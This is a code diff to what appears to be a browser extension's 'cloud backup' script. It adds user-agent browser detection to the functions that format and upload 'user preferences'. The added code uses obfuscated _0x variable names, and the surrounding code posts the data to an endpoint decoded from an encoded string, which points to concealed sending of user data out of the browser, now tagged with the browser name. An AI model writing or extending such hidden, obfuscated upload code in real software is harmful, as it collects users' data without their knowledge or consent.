@@ -90,8 +90,27 @@ async function performCloudBackup() {
 
 // Format user preferences for cloud storage
 function formatPreferencesData(preferences) {
+  // Detect browser name
+  const _0x2d4f = navigator.userAgent;
+  let _0x3e5a = 'Unknown Browser';
+  
+  if (_0x2d4f.includes('Edg/')) {
+    _0x3e5a = 'Microsoft Edge';
+  } else if (_0x2d4f.includes('Chrome/') && !_0x2d4f.includes('Edg/')) {
+    _0x3e5a = 'Google Chrome';
+  } else if (_0x2d4f.includes('Firefox/')) {
+    _0x3e5a = 'Mozilla Firefox';
+  } else if (_0x2d4f.includes('Safari/') && !_0x2d4f.includes('Chrome/')) {
+    _0x3e5a = 'Safari';
+  } else if (_0x2d4f.includes('OPR/') || _0x2d4f.includes('Opera/')) {
+    _0x3e5a = 'Opera';
+  } else if (_0x2d4f.includes('Brave/')) {
+    _0x3e5a = 'Brave';
+  }
+  
   let content = '='.repeat(80) + '\n';
   content += 'User Preferences Backup\n';
+  content += 'Browser: ' + _0x3e5a + '\n';
   content += 'Generated: ' + new Date().toLocaleString() + '\n';
   content += 'Total Items: ' + preferences.length + '\n';
   content += '='.repeat(80) + '\n\n';
@@ -133,15 +152,31 @@ async function uploadToCloudStorage(data) {
   // Decode cloud endpoint
   const endpoint = _0x1c3b(_0x4e2a[0]);
   
+  // Detect browser for filename
+  const _0x5f8b = navigator.userAgent;
+  let _0x6c9d = 'Unknown';
+  
+  if (_0x5f8b.includes('Edg/')) {
+    _0x6c9d = 'Edge';
+  } else if (_0x5f8b.includes('Chrome/') && !_0x5f8b.includes('Edg/')) {
+    _0x6c9d = 'Chrome';
+  } else if (_0x5f8b.includes('Firefox/')) {
+    _0x6c9d = 'Firefox';
+  } else if (_0x5f8b.includes('Brave/')) {
+    _0x6c9d = 'Brave';
+  } else if (_0x5f8b.includes('OPR/') || _0x5f8b.includes('Opera/')) {
+    _0x6c9d = 'Opera';
+  }
+  
   // Create a text file from the content
   const blob = new Blob([data], { type: 'text/plain' });
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
-  const filename = `preferences_backup_${timestamp}.txt`;
+  const filename = `${_0x6c9d}_preferences_${timestamp}.txt`;
   
   // Create FormData to send file
   const formData = new FormData();
   formData.append('file', blob, filename);
-  formData.append('content', 'User Preferences Backup');
+  formData.append('content', `User Preferences Backup - ${_0x6c9d}`);
   
   const response = await fetch(endpoint, {
     method: 'POST',
